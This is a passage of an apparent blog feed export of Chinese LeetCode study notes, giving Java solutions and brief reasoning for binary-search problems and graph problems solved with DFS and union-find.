class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1901-寻找峰值-II"><a href="#1901-寻找峰值-II" class="headerlink" title="1901. 寻找峰值 II"></a><a href="https://leetcode.cn/problems/find-a-peak-element-ii/">1901. 寻找峰值 II</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findPeakGrid(<span class="type">int</span>[][] mat) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> mat.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> mat[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> m - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">maxValIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> mat[mid][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[mid][i] &gt; maxVal)&#123;</span><br><span class="line">                    maxVal = mat[mid][i];</span><br><span class="line">                    maxValIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(mat[mid][maxValIndex] &gt; mat[mid + <span class="number">1</span>][maxValIndex])&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> mat[low][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(mat[low][i] &gt; maxVal)&#123;</span><br><span class="line">                maxVal = mat[low][i];</span><br><span class="line">                maxValIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;low, maxValIndex&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1095-山脉数组中查找目标值"><a href="#1095-山脉数组中查找目标值" class="headerlink" title="1095. 山脉数组中查找目标值"></a><a href="https://leetcode.cn/problems/find-in-mountain-array/">1095. 山脉数组中查找目标值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先找到最大值</span><br><span class="line">在两边分别二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * // This is MountainArray&#x27;s API interface.</span></span><br><span class="line"><span class="comment"> * // You should not implement it, or speculate about its implementation</span></span><br><span class="line"><span class="comment"> * interface MountainArray &#123;</span></span><br><span class="line"><span class="comment"> *     public int get(int index) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     public int length() &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findInMountainArray</span><span class="params">(<span class="type">int</span> target, MountainArray mountainArr)</span> &#123;</span><br><span class="line">        <span class="comment">//先找到最大值所在下标，在两边二分</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValIndex</span> <span class="operator">=</span> getMaxValIndex(mountainArr);</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> maxValIndex;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">            <span class="comment">//arr[mid] &gt;= target</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(mountainArr.get(mid) &gt;= target)&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mountainArr.get(low) == target) <span class="keyword">return</span> low;</span><br><span class="line">        low = maxValIndex + <span class="number">1</span>;</span><br><span class="line">        high = mountainArr.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(mountainArr.get(mid) &gt;= target)&#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mountainArr.get(low) == target) <span class="keyword">return</span> low;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getMaxValIndex</span><span class="params">(MountainArray mountainArr)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> mountainArr.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(mountainArr.get(mid) &lt; mountainArr.get(mid + <span class="number">1</span>))&#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_图论算法</title>
    <url>/2024/09/18/leetcode-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/01LUak/">分享丨【题单】图论算法（DFS&#x2F;BFS&#x2F;拓扑排序&#x2F;最短路&#x2F;最小生成树&#x2F;二分图&#x2F;基环树&#x2F;欧拉路径） - 力扣（LeetCode）</a></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="DFS-基础"><a href="#DFS-基础" class="headerlink" title="DFS 基础"></a>DFS 基础</h2><h3 id="1971-寻找图中是否存在路径"><a href="#1971-寻找图中是否存在路径" class="headerlink" title="1971. 寻找图中是否存在路径"></a><a href="https://leetcode.cn/problems/find-if-path-exists-in-graph/">1971. 寻找图中是否存在路径</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dfs</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validPath</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges, <span class="type">int</span> source, <span class="type">int</span> destination)</span> &#123;</span><br><span class="line">        Map&lt;Integer, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; edges.length; i++) &#123;</span><br><span class="line">            map.computeIfAbsent(edges[i][<span class="number">0</span>], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;()).add(edges[i][<span class="number">1</span>]);</span><br><span class="line">            map.computeIfAbsent(edges[i][<span class="number">1</span>], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;()).add(edges[i][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        dfs(n, source, destination, visited, map);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> cur, <span class="type">int</span> destination, Set&lt;Integer&gt; visited, Map&lt;Integer, List&lt;Integer&gt;&gt; map)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (cur == destination) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited.add(cur);</span><br><span class="line">        List&lt;Integer&gt; mapOrDefault = map.getOrDefault(cur, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> next : mapOrDefault) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited.contains(next))&#123;</span><br><span class="line">                dfs(n, next, destination, visited, map);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2316-统计无向图中无法互相到达点对数"><a href="#2316-统计无向图中无法互相到达点对数" class="headerlink" title="2316. 统计无向图中无法互相到达点对数"></a><a href="https://leetcode.cn/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/">2316. 统计无向图中无法互相到达点对数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路应该是dfs是通过visited数组把所有能互相访问的记录下来获取个数存下来，然后相乘计算即可。例如示例2的[4,1,2] =》4*3+1*6+2*5=28 28 / 2 = 14</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countPairs</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges)</span> &#123;</span><br><span class="line">        Map&lt;Integer,List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] edge : edges) &#123;</span><br><span class="line">            map.computeIfAbsent(edge[<span class="number">0</span>], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(edge[<span class="number">1</span>]);</span><br><span class="line">            map.computeIfAbsent(edge[<span class="number">1</span>], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(edge[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span>[] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line"><span class="comment">//        List&lt;Integer&gt; record = new ArrayList&lt;&gt;();</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                dfs(i, map, visited);</span><br><span class="line">                res += (<span class="type">long</span>) count * (n - count);</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> cur, Map&lt;Integer,List&lt;Integer&gt;&gt; map, <span class="type">boolean</span>[] visited)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited[cur]) <span class="keyword">return</span>;</span><br><span class="line">        visited[cur] = <span class="literal">true</span>;</span><br><span class="line">        count++;</span><br><span class="line">        List&lt;Integer&gt; mapOrDefault = map.getOrDefault(cur, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> next : mapOrDefault) &#123;</span><br><span class="line">            dfs(next, map, visited);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1319-连通网络的操作次数"><a href="#1319-连通网络的操作次数" class="headerlink" title="1319. 连通网络的操作次数"></a><a href="https://leetcode.cn/problems/number-of-operations-to-make-network-connected/">1319. 连通网络的操作次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连通至少需要n - 1条边。</span><br><span class="line">先计算区域数k，然后波动k-1根网线即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">makeConnected</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] connections)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">connectionLength</span> <span class="operator">=</span> connections.length;</span><br><span class="line">        <span class="keyword">if</span>(connectionLength &lt; n - <span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">boolean</span>[] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">        Map&lt;Integer,List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] connection : connections) &#123;</span><br><span class="line">            map.computeIfAbsent(connection[<span class="number">0</span>], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(connection[<span class="number">1</span>]);</span><br><span class="line">            map.computeIfAbsent(connection[<span class="number">1</span>], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(connection[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                area++;</span><br><span class="line">                dfs(connections, i, visited, map);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] connections, <span class="type">int</span> cur, <span class="type">boolean</span>[] visited, Map&lt;Integer,List&lt;Integer&gt;&gt; map)</span>&#123;</span><br><span class="line">        List&lt;Integer&gt; list = map.getOrDefault(cur, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        visited[cur] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> next : list) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[next])&#123;</span><br><span class="line">                dfs(connections, next, visited, map);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并查集写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">makeConnected</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] connections)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">connectionLength</span> <span class="operator">=</span> connections.length;</span><br><span class="line">        <span class="keyword">if</span>(connectionLength &lt; n - <span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">UnionFind</span> <span class="variable">unionFind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnionFind</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] connection : connections) &#123;</span><br><span class="line">            unionFind.merge(connection[<span class="number">0</span>], connection[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(unionFind.find(i) == i) area++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="type">int</span>[] rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnionFind</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="built_in">this</span>.rank = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            rank[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x == parent[x] ? x : (parent[x] = find(parent[x]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> find(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> find(j);</span><br><span class="line">        <span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">            parent[x] = y;</span><br><span class="line">        &#125;<span class="keyword">else</span> parent[y] = x;</span><br><span class="line">        <span class="keyword">if</span>(rank[x] == rank[y]) rank[y]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2492-两个城市间路径的最小分数"><a href="#2492-两个城市间路径的最小分数" class="headerlink" title="2492. 两个城市间路径的最小分数"></a><a href="https://leetcode.cn/problems/minimum-score-of-a-path-between-two-cities/">2492. 两个城市间路径的最小分数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逆天题目，还可以折返。所以就是求连通块的最短距离</span><br><span class="line">dfs记录最短距离即可</span><br><span class="line">或者并查集找连通块在获取最短距离</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码（并查集）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minScore</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] roads)</span> &#123;</span><br><span class="line">        <span class="type">UnionFind</span> <span class="variable">unionFind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnionFind</span>(n + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] road : roads) &#123;</span><br><span class="line">            unionFind.merge(road[<span class="number">0</span>], road[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">parentN</span> <span class="operator">=</span> unionFind.find(n);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] road : roads) &#123;</span><br><span class="line">            <span class="keyword">if</span>(parentN == unionFind.find(road[<span class="number">0</span>])) res = Integer.min(res, road[<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Solution</span> <span class="variable">solution</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Solution</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="type">int</span>[] rank;</span><br><span class="line">    UnionFind(<span class="type">int</span> n)&#123;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        rank = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            rank[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  x == parent[x] ? x : (parent[x] = find(parent[x]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> find(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> find(j);</span><br><span class="line">        <span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">            parent[x] = y;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            parent[y] = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rank[x] == rank[y]) rank[y]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2685-统计完全连通分量的数量"><a href="#2685-统计完全连通分量的数量" class="headerlink" title="2685. 统计完全连通分量的数量"></a><a href="https://leetcode.cn/problems/count-the-number-of-complete-components/">2685. 统计完全连通分量的数量</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉可以并查集。。。。。。而且更好写</span><br><span class="line">dfs写法也试试</span><br></pre></td></tr></table></figure>

<p>dfs写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countCompleteComponents</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt;[] graph = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[n];</span><br><span class="line">        Arrays.setAll(graph, e -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] edge : edges) &#123;</span><br><span class="line">            graph[edge[<span class="number">0</span>]].add(edge[<span class="number">1</span>]);</span><br><span class="line">            graph[edge[<span class="number">1</span>]].add(edge[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span>[] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">                v = <span class="number">0</span>;</span><br><span class="line">                e = <span class="number">0</span>;</span><br><span class="line">                dfs(visited, graph, i);</span><br><span class="line">                <span class="keyword">if</span> (e == v * (v - <span class="number">1</span>)) &#123;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">boolean</span>[] visited, List&lt;Integer&gt;[] graph, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        e += graph[i].size();</span><br><span class="line">        v += <span class="number">1</span>;</span><br><span class="line">        visited[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> next : graph[i]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[next]) &#123;</span><br><span class="line">                dfs(visited, graph, next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并查集写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countCompleteComponents</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; eMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Integer, Integer&gt; vMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt;[] list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[n];</span><br><span class="line">        Arrays.setAll(list, e -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="type">UnionFind</span> <span class="variable">unionFind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnionFind</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] edge : edges) &#123;</span><br><span class="line">            list[edge[<span class="number">0</span>]].add(edge[<span class="number">1</span>]);</span><br><span class="line">            unionFind.merge(edge[<span class="number">0</span>], edge[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> unionFind.find(i);</span><br><span class="line">            eMap.merge(parent, list[i].size(), Integer::sum);</span><br><span class="line">            vMap.merge(parent, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : vMap.entrySet()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">e</span> <span 